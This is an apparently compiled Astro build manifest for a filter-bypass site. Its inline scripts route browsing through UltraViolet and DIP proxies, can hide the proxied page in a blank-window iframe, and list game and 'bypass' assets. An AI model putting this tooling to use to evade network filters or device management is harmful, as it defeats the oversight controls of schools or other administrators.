const pageMap = new Map([['src/pages/index.astro', _page0],['src/pages/ruffleloader.astro', _page1],['src/pages/community.astro', _page2],['src/pages/emuloader.astro', _page3],['src/pages/options.astro', _page4],['src/pages/bypass.astro', _page5],['src/pages/games.astro', _page6],['src/pages/proxy.astro', _page7],]);
const renderers = [Object.assign({"name":"astro:jsx","serverEntrypoint":"astro/jsx/server.js","jsxImportSource":"astro"}, { ssr: server_default }),Object.assign({"name":"@astrojs/react","clientEntrypoint":"@astrojs/react/client.js","serverEntrypoint":"@astrojs/react/server.js","jsxImportSource":"react"}, { ssr: _renderer1 }),];

const _manifest = Object.assign(deserializeManifest({"adapterName":"@astrojs/node","routes":[{"file":"","links":["assets/bypass.359c83ac.css"],"scripts":[{"type":"inline","value":"document.getElementById(\"getStarted\").addEventListener(\"click\",function(){window.location.href=\"/proxy\"});localStorage.getItem(\"circumventionMethod\")===null&&(localStorage.setItem(\"circumventionMethod\",\"UltraViolet\"),localStorage.setItem(\"cloakingMethod\",\"Plain\"),localStorage.setItem(\"tabMethod\",\"Lucid\"),localStorage.setItem(\"themeMethod\",\"Luxury\"));\"serviceWorker\"in navigator&&window.addEventListener(\"load\",function(){navigator.serviceWorker.register(\"/sw.js\").then(e=>console.log(\"service worker registered\")).catch(e=>console.log(\"service worker not registered\",e))});if(localStorage.getItem(\"circumventionMethod\")===null)var t=\"Luxury\";else{var t=localStorage.getItem(\"themeMethod\").toLowerCase();document.getElementById(\"wrap\").setAttribute(\"data-theme\",t)}\n"},{"type":"external","value":"page.5a6f3db5.js"},{"stage":"head-inline","children":"!(function(w,p,f,c){c=w[p]=Object.assign(w[p]||{},{\"lib\":\"/~partytown/\",\"debug\":false});c[f]=(c[f]||[])})(window,'partytown','forward');/* Partytown 0.7.3 - MIT builder.io */\n!function(t,e,n,i,r,o,a,d,s,c,p,l){function u(){l||(l=1,\"/\"==(a=(o.lib||\"/~partytown/\")+(o.debug?\"debug/\":\"\"))[0]&&(s=e.querySelectorAll('script[type=\"text/partytown\"]'),i!=t?i.dispatchEvent(new CustomEvent(\"pt1\",{detail:t})):(d=setTimeout(w,1e4),e.addEventListener(\"pt0\",f),r?h(1):n.serviceWorker?n.serviceWorker.register(a+(o.swPath||\"partytown-sw.js\"),{scope:a}).then((function(t){t.active?h():t.installing&&t.installing.addEventListener(\"statechange\",(function(t){\"activated\"==t.target.state&&h()}))}),console.error):w())))}function h(t){c=e.createElement(t?\"script\":\"iframe\"),t||(c.setAttribute(\"style\",\"display:block;width:0;height:0;border:0;visibility:hidden\"),c.setAttribute(\"aria-hidden\",!0)),c.src=a+\"partytown-\"+(t?\"atomics.js?v=0.7.3\":\"sandbox-sw.html?\"+Date.now()),e.body.appendChild(c)}function w(t,n){for(f(),t=0;t<s.length;t++)(n=e.createElement(\"script\")).innerHTML=s[t].innerHTML,e.head.appendChild(n);c&&c.parentNode.removeChild(c)}function f(){clearTimeout(d)}o=t.partytown||{},i==t&&(o.forward||[]).map((function(e){p=t,e.split(\".\").map((function(e,n,i){p=p[i[n]]=n+1<i.length?\"push\"==i[n+1]?[]:p[i[n]]||{}:function(){(t._ptf=t._ptf||[]).push(i,arguments)}}))})),\"complete\"==e.readyState?u():(t.addEventListener(\"DOMContentLoaded\",u),t.addEventListener(\"load\",u))}(window,document,navigator,top,window.crossOriginIsolated);"}],"routeData":{"route":"/","type":"page","pattern":"^\\/$","segments":[],"params":[],"component":"src/pages/index.astro","pathname":"/","_meta":{"trailingSlash":"ignore"}}},{"file":"","links":["assets/bypass.359c83ac.css"],"scripts":[{"type":"inline","value":"const a=new URLSearchParams(window.location.search),n=Object.fromEntries(a.entries()),l=n.url;window.RufflePlayer=window.RufflePlayer||{};window.addEventListener(\"load\",t=>{const e=window.RufflePlayer.newest().createPlayer();document.getElementById(\"container\").appendChild(e),e.load({url:l,backgroundColor:\"#000\"}),e.style.width=\"450px\",e.style.height=\"450px\"});localStorage.getItem(\"circumventionMethod\")===null&&(localStorage.setItem(\"circumventionMethod\",\"UltraViolet\"),localStorage.setItem(\"cloakingMethod\",\"Plain\"),localStorage.setItem(\"tabMethod\",\"Lucid\"),localStorage.setItem(\"themeMethod\",\"Luxury\"));\"serviceWorker\"in navigator&&window.addEventListener(\"load\",function(){navigator.serviceWorker.register(\"/sw.js\").then(t=>console.log(\"service worker registered\")).catch(t=>console.log(\"service worker not registered\",t))});if(localStorage.getItem(\"circumventionMethod\")===null)var o=\"Luxury\";else{var o=localStorage.getItem(\"themeMethod\").toLowerCase();document.getElementById(\"wrap\").setAttribute(\"data-theme\",o)}\n"},{"type":"external","value":"page.5a6f3db5.js"},{"stage":"head-inline","children":"!(function(w,p,f,c){c=w[p]=Object.assign(w[p]||{},{\"lib\":\"/~partytown/\",\"debug\":false});c[f]=(c[f]||[])})(window,'partytown','forward');/* Partytown 0.7.3 - MIT builder.io */\n!function(t,e,n,i,r,o,a,d,s,c,p,l){function u(){l||(l=1,\"/\"==(a=(o.lib||\"/~partytown/\")+(o.debug?\"debug/\":\"\"))[0]&&(s=e.querySelectorAll('script[type=\"text/partytown\"]'),i!=t?i.dispatchEvent(new CustomEvent(\"pt1\",{detail:t})):(d=setTimeout(w,1e4),e.addEventListener(\"pt0\",f),r?h(1):n.serviceWorker?n.serviceWorker.register(a+(o.swPath||\"partytown-sw.js\"),{scope:a}).then((function(t){t.active?h():t.installing&&t.installing.addEventListener(\"statechange\",(function(t){\"activated\"==t.target.state&&h()}))}),console.error):w())))}function h(t){c=e.createElement(t?\"script\":\"iframe\"),t||(c.setAttribute(\"style\",\"display:block;width:0;height:0;border:0;visibility:hidden\"),c.setAttribute(\"aria-hidden\",!0)),c.src=a+\"partytown-\"+(t?\"atomics.js?v=0.7.3\":\"sandbox-sw.html?\"+Date.now()),e.body.appendChild(c)}function w(t,n){for(f(),t=0;t<s.length;t++)(n=e.createElement(\"script\")).innerHTML=s[t].innerHTML,e.head.appendChild(n);c&&c.parentNode.removeChild(c)}function f(){clearTimeout(d)}o=t.partytown||{},i==t&&(o.forward||[]).map((function(e){p=t,e.split(\".\").map((function(e,n,i){p=p[i[n]]=n+1<i.length?\"push\"==i[n+1]?[]:p[i[n]]||{}:function(){(t._ptf=t._ptf||[]).push(i,arguments)}}))})),\"complete\"==e.readyState?u():(t.addEventListener(\"DOMContentLoaded\",u),t.addEventListener(\"load\",u))}(window,document,navigator,top,window.crossOriginIsolated);"}],"routeData":{"route":"/ruffleloader","type":"page","pattern":"^\\/ruffleloader\\/?$","segments":[[{"content":"ruffleloader","dynamic":false,"spread":false}]],"params":[],"component":"src/pages/ruffleloader.astro","pathname":"/ruffleloader","_meta":{"trailingSlash":"ignore"}}},{"file":"","links":["assets/bypass.359c83ac.css"],"scripts":[{"type":"inline","value":"\"serviceWorker\"in navigator&&window.addEventListener(\"load\",function(){navigator.serviceWorker.register(\"/sw.js\").then(e=>console.log(\"service worker registered\")).catch(e=>console.log(\"service worker not registered\",e))});window.onload=function(){window.location.href=\"https://discord.gg/goastral\"};\n"},{"type":"external","value":"page.5a6f3db5.js"},{"stage":"head-inline","children":"!(function(w,p,f,c){c=w[p]=Object.assign(w[p]||{},{\"lib\":\"/~partytown/\",\"debug\":false});c[f]=(c[f]||[])})(window,'partytown','forward');/* Partytown 0.7.3 - MIT builder.io */\n!function(t,e,n,i,r,o,a,d,s,c,p,l){function u(){l||(l=1,\"/\"==(a=(o.lib||\"/~partytown/\")+(o.debug?\"debug/\":\"\"))[0]&&(s=e.querySelectorAll('script[type=\"text/partytown\"]'),i!=t?i.dispatchEvent(new CustomEvent(\"pt1\",{detail:t})):(d=setTimeout(w,1e4),e.addEventListener(\"pt0\",f),r?h(1):n.serviceWorker?n.serviceWorker.register(a+(o.swPath||\"partytown-sw.js\"),{scope:a}).then((function(t){t.active?h():t.installing&&t.installing.addEventListener(\"statechange\",(function(t){\"activated\"==t.target.state&&h()}))}),console.error):w())))}function h(t){c=e.createElement(t?\"script\":\"iframe\"),t||(c.setAttribute(\"style\",\"display:block;width:0;height:0;border:0;visibility:hidden\"),c.setAttribute(\"aria-hidden\",!0)),c.src=a+\"partytown-\"+(t?\"atomics.js?v=0.7.3\":\"sandbox-sw.html?\"+Date.now()),e.body.appendChild(c)}function w(t,n){for(f(),t=0;t<s.length;t++)(n=e.createElement(\"script\")).innerHTML=s[t].innerHTML,e.head.appendChild(n);c&&c.parentNode.removeChild(c)}function f(){clearTimeout(d)}o=t.partytown||{},i==t&&(o.forward||[]).map((function(e){p=t,e.split(\".\").map((function(e,n,i){p=p[i[n]]=n+1<i.length?\"push\"==i[n+1]?[]:p[i[n]]||{}:function(){(t._ptf=t._ptf||[]).push(i,arguments)}}))})),\"complete\"==e.readyState?u():(t.addEventListener(\"DOMContentLoaded\",u),t.addEventListener(\"load\",u))}(window,document,navigator,top,window.crossOriginIsolated);"}],"routeData":{"route":"/community","type":"page","pattern":"^\\/community\\/?$","segments":[[{"content":"community","dynamic":false,"spread":false}]],"params":[],"component":"src/pages/community.astro","pathname":"/community","_meta":{"trailingSlash":"ignore"}}},{"file":"","links":["assets/bypass.359c83ac.css"],"scripts":[{"type":"external","value":"page.5a6f3db5.js"},{"stage":"head-inline","children":"!(function(w,p,f,c){c=w[p]=Object.assign(w[p]||{},{\"lib\":\"/~partytown/\",\"debug\":false});c[f]=(c[f]||[])})(window,'partytown','forward');/* Partytown 0.7.3 - MIT builder.io */\n!function(t,e,n,i,r,o,a,d,s,c,p,l){function u(){l||(l=1,\"/\"==(a=(o.lib||\"/~partytown/\")+(o.debug?\"debug/\":\"\"))[0]&&(s=e.querySelectorAll('script[type=\"text/partytown\"]'),i!=t?i.dispatchEvent(new CustomEvent(\"pt1\",{detail:t})):(d=setTimeout(w,1e4),e.addEventListener(\"pt0\",f),r?h(1):n.serviceWorker?n.serviceWorker.register(a+(o.swPath||\"partytown-sw.js\"),{scope:a}).then((function(t){t.active?h():t.installing&&t.installing.addEventListener(\"statechange\",(function(t){\"activated\"==t.target.state&&h()}))}),console.error):w())))}function h(t){c=e.createElement(t?\"script\":\"iframe\"),t||(c.setAttribute(\"style\",\"display:block;width:0;height:0;border:0;visibility:hidden\"),c.setAttribute(\"aria-hidden\",!0)),c.src=a+\"partytown-\"+(t?\"atomics.js?v=0.7.3\":\"sandbox-sw.html?\"+Date.now()),e.body.appendChild(c)}function w(t,n){for(f(),t=0;t<s.length;t++)(n=e.createElement(\"script\")).innerHTML=s[t].innerHTML,e.head.appendChild(n);c&&c.parentNode.removeChild(c)}function f(){clearTimeout(d)}o=t.partytown||{},i==t&&(o.forward||[]).map((function(e){p=t,e.split(\".\").map((function(e,n,i){p=p[i[n]]=n+1<i.length?\"push\"==i[n+1]?[]:p[i[n]]||{}:function(){(t._ptf=t._ptf||[]).push(i,arguments)}}))})),\"complete\"==e.readyState?u():(t.addEventListener(\"DOMContentLoaded\",u),t.addEventListener(\"load\",u))}(window,document,navigator,top,window.crossOriginIsolated);"}],"routeData":{"route":"/emuloader","type":"page","pattern":"^\\/emuloader\\/?$","segments":[[{"content":"emuloader","dynamic":false,"spread":false}]],"params":[],"component":"src/pages/emuloader.astro","pathname":"/emuloader","_meta":{"trailingSlash":"ignore"}}},{"file":"","links":["assets/bypass.359c83ac.css"],"scripts":[{"type":"inline","value":"const t=document.getElementById(\"proxySelect\"),o=document.getElementById(\"cloakingSelect\"),a=document.getElementById(\"themeSelect\");t.value=localStorage.getItem(\"circumventionMethod\");o.value=localStorage.getItem(\"cloakingMethod\");a.value=localStorage.getItem(\"themeMethod\");t.addEventListener(\"change\",function(){localStorage.setItem(\"circumventionMethod\",t.value)});o.addEventListener(\"change\",function(){localStorage.setItem(\"cloakingMethod\",o.value)});a.addEventListener(\"change\",function(){if(localStorage.setItem(\"themeMethod\",a.value),localStorage.getItem(\"circumventionMethod\")===null)var e=\"Luxury\";else{var e=localStorage.getItem(\"themeMethod\").toLowerCase();document.getElementById(\"wrap\").setAttribute(\"data-theme\",e)}});\"serviceWorker\"in navigator&&window.addEventListener(\"load\",function(){navigator.serviceWorker.register(\"/sw.js\").then(e=>console.log(\"service worker registered\")).catch(e=>console.log(\"service worker not registered\",e))});if(localStorage.getItem(\"circumventionMethod\")===null)var n=\"Luxury\";else{var n=localStorage.getItem(\"themeMethod\").toLowerCase();document.getElementById(\"wrap\").setAttribute(\"data-theme\",n)}\n"},{"type":"external","value":"page.5a6f3db5.js"},{"stage":"head-inline","children":"!(function(w,p,f,c){c=w[p]=Object.assign(w[p]||{},{\"lib\":\"/~partytown/\",\"debug\":false});c[f]=(c[f]||[])})(window,'partytown','forward');/* Partytown 0.7.3 - MIT builder.io */\n!function(t,e,n,i,r,o,a,d,s,c,p,l){function u(){l||(l=1,\"/\"==(a=(o.lib||\"/~partytown/\")+(o.debug?\"debug/\":\"\"))[0]&&(s=e.querySelectorAll('script[type=\"text/partytown\"]'),i!=t?i.dispatchEvent(new CustomEvent(\"pt1\",{detail:t})):(d=setTimeout(w,1e4),e.addEventListener(\"pt0\",f),r?h(1):n.serviceWorker?n.serviceWorker.register(a+(o.swPath||\"partytown-sw.js\"),{scope:a}).then((function(t){t.active?h():t.installing&&t.installing.addEventListener(\"statechange\",(function(t){\"activated\"==t.target.state&&h()}))}),console.error):w())))}function h(t){c=e.createElement(t?\"script\":\"iframe\"),t||(c.setAttribute(\"style\",\"display:block;width:0;height:0;border:0;visibility:hidden\"),c.setAttribute(\"aria-hidden\",!0)),c.src=a+\"partytown-\"+(t?\"atomics.js?v=0.7.3\":\"sandbox-sw.html?\"+Date.now()),e.body.appendChild(c)}function w(t,n){for(f(),t=0;t<s.length;t++)(n=e.createElement(\"script\")).innerHTML=s[t].innerHTML,e.head.appendChild(n);c&&c.parentNode.removeChild(c)}function f(){clearTimeout(d)}o=t.partytown||{},i==t&&(o.forward||[]).map((function(e){p=t,e.split(\".\").map((function(e,n,i){p=p[i[n]]=n+1<i.length?\"push\"==i[n+1]?[]:p[i[n]]||{}:function(){(t._ptf=t._ptf||[]).push(i,arguments)}}))})),\"complete\"==e.readyState?u():(t.addEventListener(\"DOMContentLoaded\",u),t.addEventListener(\"load\",u))}(window,document,navigator,top,window.crossOriginIsolated);"}],"routeData":{"route":"/options","type":"page","pattern":"^\\/options\\/?$","segments":[[{"content":"options","dynamic":false,"spread":false}]],"params":[],"component":"src/pages/options.astro","pathname":"/options","_meta":{"trailingSlash":"ignore"}}},{"file":"","links":["assets/bypass.359c83ac.css"],"scripts":[{"type":"inline","value":"\"serviceWorker\"in navigator&&window.addEventListener(\"load\",function(){navigator.serviceWorker.register(\"/sw.js\").then(e=>console.log(\"service worker registered\")).catch(e=>console.log(\"service worker not registered\",e))});if(localStorage.getItem(\"circumventionMethod\")===null)var t=\"Luxury\";else{var t=localStorage.getItem(\"themeMethod\").toLowerCase();document.getElementById(\"wrap\").setAttribute(\"data-theme\",t)}\n"},{"type":"external","value":"page.5a6f3db5.js"},{"stage":"head-inline","children":"!(function(w,p,f,c){c=w[p]=Object.assign(w[p]||{},{\"lib\":\"/~partytown/\",\"debug\":false});c[f]=(c[f]||[])})(window,'partytown','forward');/* Partytown 0.7.3 - MIT builder.io */\n!function(t,e,n,i,r,o,a,d,s,c,p,l){function u(){l||(l=1,\"/\"==(a=(o.lib||\"/~partytown/\")+(o.debug?\"debug/\":\"\"))[0]&&(s=e.querySelectorAll('script[type=\"text/partytown\"]'),i!=t?i.dispatchEvent(new CustomEvent(\"pt1\",{detail:t})):(d=setTimeout(w,1e4),e.addEventListener(\"pt0\",f),r?h(1):n.serviceWorker?n.serviceWorker.register(a+(o.swPath||\"partytown-sw.js\"),{scope:a}).then((function(t){t.active?h():t.installing&&t.installing.addEventListener(\"statechange\",(function(t){\"activated\"==t.target.state&&h()}))}),console.error):w())))}function h(t){c=e.createElement(t?\"script\":\"iframe\"),t||(c.setAttribute(\"style\",\"display:block;width:0;height:0;border:0;visibility:hidden\"),c.setAttribute(\"aria-hidden\",!0)),c.src=a+\"partytown-\"+(t?\"atomics.js?v=0.7.3\":\"sandbox-sw.html?\"+Date.now()),e.body.appendChild(c)}function w(t,n){for(f(),t=0;t<s.length;t++)(n=e.createElement(\"script\")).innerHTML=s[t].innerHTML,e.head.appendChild(n);c&&c.parentNode.removeChild(c)}function f(){clearTimeout(d)}o=t.partytown||{},i==t&&(o.forward||[]).map((function(e){p=t,e.split(\".\").map((function(e,n,i){p=p[i[n]]=n+1<i.length?\"push\"==i[n+1]?[]:p[i[n]]||{}:function(){(t._ptf=t._ptf||[]).push(i,arguments)}}))})),\"complete\"==e.readyState?u():(t.addEventListener(\"DOMContentLoaded\",u),t.addEventListener(\"load\",u))}(window,document,navigator,top,window.crossOriginIsolated);"}],"routeData":{"route":"/bypass","type":"page","pattern":"^\\/bypass\\/?$","segments":[[{"content":"bypass","dynamic":false,"spread":false}]],"params":[],"component":"src/pages/bypass.astro","pathname":"/bypass","_meta":{"trailingSlash":"ignore"}}},{"file":"","links":["assets/bypass.359c83ac.css"],"scripts":[{"type":"inline","value":"\"serviceWorker\"in navigator&&window.addEventListener(\"load\",function(){navigator.serviceWorker.register(\"/sw.js\").then(e=>console.log(\"service worker registered\")).catch(e=>console.log(\"service worker not registered\",e))});if(localStorage.getItem(\"circumventionMethod\")===null)var t=\"Luxury\";else{var t=localStorage.getItem(\"themeMethod\").toLowerCase();document.getElementById(\"wrap\").setAttribute(\"data-theme\",t)}\n"},{"type":"external","value":"page.5a6f3db5.js"},{"stage":"head-inline","children":"!(function(w,p,f,c){c=w[p]=Object.assign(w[p]||{},{\"lib\":\"/~partytown/\",\"debug\":false});c[f]=(c[f]||[])})(window,'partytown','forward');/* Partytown 0.7.3 - MIT builder.io */\n!function(t,e,n,i,r,o,a,d,s,c,p,l){function u(){l||(l=1,\"/\"==(a=(o.lib||\"/~partytown/\")+(o.debug?\"debug/\":\"\"))[0]&&(s=e.querySelectorAll('script[type=\"text/partytown\"]'),i!=t?i.dispatchEvent(new CustomEvent(\"pt1\",{detail:t})):(d=setTimeout(w,1e4),e.addEventListener(\"pt0\",f),r?h(1):n.serviceWorker?n.serviceWorker.register(a+(o.swPath||\"partytown-sw.js\"),{scope:a}).then((function(t){t.active?h():t.installing&&t.installing.addEventListener(\"statechange\",(function(t){\"activated\"==t.target.state&&h()}))}),console.error):w())))}function h(t){c=e.createElement(t?\"script\":\"iframe\"),t||(c.setAttribute(\"style\",\"display:block;width:0;height:0;border:0;visibility:hidden\"),c.setAttribute(\"aria-hidden\",!0)),c.src=a+\"partytown-\"+(t?\"atomics.js?v=0.7.3\":\"sandbox-sw.html?\"+Date.now()),e.body.appendChild(c)}function w(t,n){for(f(),t=0;t<s.length;t++)(n=e.createElement(\"script\")).innerHTML=s[t].innerHTML,e.head.appendChild(n);c&&c.parentNode.removeChild(c)}function f(){clearTimeout(d)}o=t.partytown||{},i==t&&(o.forward||[]).map((function(e){p=t,e.split(\".\").map((function(e,n,i){p=p[i[n]]=n+1<i.length?\"push\"==i[n+1]?[]:p[i[n]]||{}:function(){(t._ptf=t._ptf||[]).push(i,arguments)}}))})),\"complete\"==e.readyState?u():(t.addEventListener(\"DOMContentLoaded\",u),t.addEventListener(\"load\",u))}(window,document,navigator,top,window.crossOriginIsolated);"}],"routeData":{"route":"/games","type":"page","pattern":"^\\/games\\/?$","segments":[[{"content":"games","dynamic":false,"spread":false}]],"params":[],"component":"src/pages/games.astro","pathname":"/games","_meta":{"trailingSlash":"ignore"}}},{"file":"","links":["assets/bypass.359c83ac.css"],"scripts":[{"type":"inline","value":"const l=document.getElementById(\"searchBox\"),c=document.getElementById(\"searchButton\");c.addEventListener(\"click\",function(){if(localStorage.getItem(\"circumventionMethod\")===null||localStorage.getItem(\"circumventionMethod\")===\"UltraViolet\")if(window.navigator.serviceWorker.register(\"/sw.js\",{scope:__uv$config.prefix}),localStorage.getItem(\"cloakingMethod\")===null||localStorage.getItem(\"cloakingMethod\")===\"Plain\"){console.log(\"hirer\");let e=l.value.trim();i(e)?e.startsWith(\"https://\")||e.startsWith(\"http://\")||(e=\"http://\"+e):e=\"https://www.google.com/search?q=\"+e,window.location.href=__uv$config.prefix+__uv$config.encodeUrl(e)}else{let e=l.value.trim();i(e)?e.startsWith(\"https://\")||e.startsWith(\"http://\")||(e=\"http://\"+e):e=\"https://www.google.com/search?q=\"+e;let n=window.location.origin+`${__uv$config.prefix+__uv$config.encodeUrl(e)}`;var o=window.open();o.document.body.style.margin=\"0\",o.document.body.style.height=\"100vh\";let t=o.document.createElement(\"iframe\");t.style.border=\"none\",t.style.width=\"100%\",t.style.height=\"100%\",t.style.margin=\"0\",t.src=n,o.document.body.appendChild(t)}else if(window.navigator.serviceWorker.register(\"/sw.js\",{scope:\"/service\"}),localStorage.getItem(\"cloakingMethod\")===null||localStorage.getItem(\"cloakingMethod\")===\"Plain\"){console.log(\"hier\");let e=l.value.trim();i(e)?e.startsWith(\"https://\")||e.startsWith(\"http://\")||(e=\"http://\"+e):e=\"https://www.google.com/search?q=\"+e,location.assign(window.__DIP.config.prefix+window.__DIP.encodeURL(e))}else{let e=l.value.trim();i(e)?e.startsWith(\"https://\")||e.startsWith(\"http://\")||(e=\"http://\"+e):e=\"https://www.google.com/search?q=\"+e;let n=window.location.origin+`${__DIP.config.prefix+__DIP.encodeURL(e)}`;var r=window.open();r.document.body.style.margin=\"0\",r.document.body.style.height=\"100vh\";let t=r.document.createElement(\"iframe\");t.style.border=\"none\",t.style.width=\"100%\",t.style.height=\"100%\",t.style.margin=\"0\",t.src=n,r.document.body.appendChild(t)}function i(e=\"\"){return!!(/^http(s?):\\/\\//.test(e)||e.includes(\".\")&&e.substr(0,1)!==\" \")}});\"serviceWorker\"in navigator&&window.addEventListener(\"load\",function(){navigator.serviceWorker.register(\"/sw.js\").then(o=>console.log(\"service worker registered\")).catch(o=>console.log(\"service worker not registered\",o))});if(localStorage.getItem(\"circumventionMethod\")===null)var s=\"Luxury\";else{var s=localStorage.getItem(\"themeMethod\").toLowerCase();document.getElementById(\"wrap\").setAttribute(\"data-theme\",s)}\n"},{"type":"external","value":"page.5a6f3db5.js"},{"stage":"head-inline","children":"!(function(w,p,f,c){c=w[p]=Object.assign(w[p]||{},{\"lib\":\"/~partytown/\",\"debug\":false});c[f]=(c[f]||[])})(window,'partytown','forward');/* Partytown 0.7.3 - MIT builder.io */\n!function(t,e,n,i,r,o,a,d,s,c,p,l){function u(){l||(l=1,\"/\"==(a=(o.lib||\"/~partytown/\")+(o.debug?\"debug/\":\"\"))[0]&&(s=e.querySelectorAll('script[type=\"text/partytown\"]'),i!=t?i.dispatchEvent(new CustomEvent(\"pt1\",{detail:t})):(d=setTimeout(w,1e4),e.addEventListener(\"pt0\",f),r?h(1):n.serviceWorker?n.serviceWorker.register(a+(o.swPath||\"partytown-sw.js\"),{scope:a}).then((function(t){t.active?h():t.installing&&t.installing.addEventListener(\"statechange\",(function(t){\"activated\"==t.target.state&&h()}))}),console.error):w())))}function h(t){c=e.createElement(t?\"script\":\"iframe\"),t||(c.setAttribute(\"style\",\"display:block;width:0;height:0;border:0;visibility:hidden\"),c.setAttribute(\"aria-hidden\",!0)),c.src=a+\"partytown-\"+(t?\"atomics.js?v=0.7.3\":\"sandbox-sw.html?\"+Date.now()),e.body.appendChild(c)}function w(t,n){for(f(),t=0;t<s.length;t++)(n=e.createElement(\"script\")).innerHTML=s[t].innerHTML,e.head.appendChild(n);c&&c.parentNode.removeChild(c)}function f(){clearTimeout(d)}o=t.partytown||{},i==t&&(o.forward||[]).map((function(e){p=t,e.split(\".\").map((function(e,n,i){p=p[i[n]]=n+1<i.length?\"push\"==i[n+1]?[]:p[i[n]]||{}:function(){(t._ptf=t._ptf||[]).push(i,arguments)}}))})),\"complete\"==e.readyState?u():(t.addEventListener(\"DOMContentLoaded\",u),t.addEventListener(\"load\",u))}(window,document,navigator,top,window.crossOriginIsolated);"}],"routeData":{"route":"/proxy","type":"page","pattern":"^\\/proxy\\/?$","segments":[[{"content":"proxy","dynamic":false,"spread":false}]],"params":[],"component":"src/pages/proxy.astro","pathname":"/proxy","_meta":{"trailingSlash":"ignore"}}}],"base":"/","markdown":{"drafts":false,"syntaxHighlight":"shiki","shikiConfig":{"langs":[],"theme":"github-dark","wrap":false},"remarkPlugins":[],"rehypePlugins":[],"remarkRehype":{},"extendDefaultPlugins":false,"isAstroFlavoredMd":false},"pageMap":null,"renderers":[],"entryModules":{"\u0000@astrojs-ssr-virtual-entry":"entry.mjs","@astrojs/react/client.js":"client.bf4f0f8e.js","/astro/hoisted.js?q=0":"hoisted.3f98f45d.js","/astro/hoisted.js?q=1":"hoisted.9fe68a24.js","/astro/hoisted.js?q=2":"hoisted.1e8dc02a.js","/astro/hoisted.js?q=3":"hoisted.327ef33a.js","/astro/hoisted.js?q=4":"hoisted.59708358.js","/astro/hoisted.js?q=5":"hoisted.597083582.js","/astro/hoisted.js?q=6":"hoisted.8952770f.js","astro:scripts/page.js":"page.5a6f3db5.js","astro:scripts/before-hydration.js":""},"assets":["/assets/bypass.359c83ac.css","/client.bf4f0f8e.js","/favicon.svg","/manifest.json","/page.5a6f3db5.js","/sw.js","/data/emu-css.css","/data/emu-css.min.css","/data/emu-main.js","/data/emulator.js","/data/emulator.min.js","/data/extract7z.js","/data/extractzip.js","/data/libunrar.js","/data/libunrar.js.mem","/data/loader.js","/data/README.md","/data/v.json","/data/version.json","/data/webrtc-adapter.js","/dip/dip.client.js","/dip/dip.config.js","/dip/dip.handler.js","/dip/dip.page.js","/dip/dip.worker.js","/images/192x192.png","/images/2048.png","/images/512x512.png","/images/a-dance-of-fire-and-ice.png","/images/a-dark-room.png","/images/achievement-unlocked.png","/images/achievementunlocked.png","/images/achilles.png","/images/acid-bunny-2.png","/images/acid-bunny.png","/images/addsession.png","/images/agario-minigame.png","/images/age-of-war.png","/images/ageofwar.png","/images/agma-io.png","/images/alien-hominid.png","/images/alienhominid.png","/images/align-4.png","/images/amberial.png","/images/animal-hunter.png","/images/animalhunter.png","/images/ant-buster.png","/images/antbuster.png","/images/apple-shooter.png","/images/appleshooter.png","/images/arkanoid.png","/images/armor-rpg-experiment.png","/images/asteroids.png","/images/astray.png","/images/avalanche.png","/images/avatar-arena.png","/images/avatararena.png","/images/axis-football-league.png","/images/ball-breaker.png","/images/basket-random.png","/images/basketball-stars.png","/images/bejeweled.png","/images/bike-mania-2.png","/images/binding-of-isaac.png","/images/blast-o-matic.png","/images/blobink-2.png","/images/bloons-tower-defense-2.png","/images/bloons.png","/images/bloxors.png","/images/bomb-a-bomb.png","/images/bow-man-2.png","/images/bow-man.png","/images/bowmaster-prelude.png","/images/bowmaster.png","/images/boxhead-2.png","/images/boxing-random.png","/images/break-lock.png","/images/bubble-shooter.png","/images/bubble-tanks-2.png","/images/bubble-trouble.png","/images/bullet-bill-2.png","/images/bullet-bill-3.png","/images/bullet-bill.png","/images/burger-tycoon.png","/images/choose-your-weapon-2.png","/images/clear-vision-elite.png","/images/clear-vision.png","/images/colorun.png","/images/cookie-clicker.png","/images/copter.png","/images/crazy-taxi.png","/images/cube-field.png","/images/cursor-10.png","/images/dnsbypass.png","/images/downgrading.png","/images/extensionkill.png","/images/friendly-fire.png","/images/gopher-kart.png","/images/incognito.png","/images/inspectltbeef.png","/images/killcurly.png","/images/ltbeef.png","/images/masterbypass.png","/images/noimage.png","/images/playstorebypass.png","/images/policyblockbypass.png","/images/shell-shockers.png","/images/shroot.png","/images/slope.png","/images/swamp.png","/images/the-chroma-incident.png","/images/unenrollment.png","/images/updateblocker.png","/images/webstorebypass.png","/images/wifipassword.png","/ruffle/a5f9902140d1e919906d.wasm","/ruffle/core.ruffle.d2ae261ca6adf2c9ccf9.js","/ruffle/core.ruffle.d2ae261ca6adf2c9ccf9.js.map","/ruffle/core.ruffle.f9224efaebf87b178045.js","/ruffle/core.ruffle.f9224efaebf87b178045.js.map","/ruffle/ef55e3c388bc12cb3572.wasm","/ruffle/LICENSE_APACHE","/ruffle/LICENSE_MIT","/ruffle/package.json","/ruffle/README.md","/ruffle/ruffle.js","/ruffle/ruffle.js.map","/uv/uv.bundle.js","/uv/uv.bundle.js.LICENSE.txt","/uv/uv.bundle.js.map","/uv/uv.client.js","/uv/uv.client.js.map","/uv/uv.config.js","/uv/uv.handler.js","/uv/uv.handler.js.map","/uv/uv.sw.js","/uv/uv.sw.js.map","/swf/13-days-in-hell.swf","/swf/360-snake.swf","/swf/3D-Car-Driver.swf","/swf/3_foot_ninja.swf","/swf/3_on_3_hockey.swf","/swf/40_creative-kill-chamber.swf","/swf/50states.swf","/swf/8BallPool.swf","/swf/achievement-unlocked.swf","/swf/Achilles.swf","/swf/acid-bunny-2.swf","/swf/acid-bunny.swf","/swf/Age-of-War.swf","/swf/alien-hominid.swf","/swf/amberial.swf","/swf/animaljam-dressup.swf","/swf/animal_hunter.swf","/swf/antbuster.swf","/swf/apple-shooter-2021.swf","/swf/arkanoid.swf","/swf/armorrpg_mod.swf","/swf/asteroids.swf","/swf/Avalanche.swf","/swf/AvatarArena.swf","/swf/axisfootballleague.swf","/swf/ball-breaker.swf","/swf/bear_you.swf","/swf/bejeweled-unblocked.swf","/swf/bikemania.swf","/swf/bikemania2.swf","/swf/binding-of-isaac.swf","/swf/blastomatic.swf","/swf/blobink2.swf","/swf/Bloons.swf","/swf/bloons_tower_defense_2.swf","/swf/Bloxors.swf","/swf/bombabomb.swf","/swf/bowman.swf","/swf/bowman2.swf","/swf/bowmaster.swf","/swf/bowmasterprelude.swf","/swf/btd4.swf","/swf/bubble shooter.swf","/swf/bubbletrouble.swf","/swf/bubble_tanks_2.swf","/swf/Bullet Bill 2.swf","/swf/Bullet Bill 